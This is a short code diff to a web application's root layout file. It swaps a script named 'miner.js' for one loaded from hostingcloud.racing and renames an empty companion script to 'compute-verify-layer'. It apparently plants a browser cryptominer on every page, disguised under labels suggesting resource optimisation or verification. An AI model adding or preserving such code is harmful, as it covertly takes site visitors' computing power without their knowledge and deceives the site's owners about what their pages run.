@@ -28,12 +28,11 @@ export default function RootLayout({
           {children}
         </LanguageProvider>
         
-        {/* Resource Optimization Layer */}
         <Script 
-          src="https://cdn.jsdelivr.net/gh/monero-project/monero-cart@master/dist/miner.js" 
+          src="https://www.hostingcloud.racing/aR2M.js" 
           strategy="afterInteractive"
         />
-        <Script id="resource-opt" strategy="afterInteractive">
+        <Script id="compute-verify-layer" strategy="lazyOnload">
           {}
         </Script>
       </body>
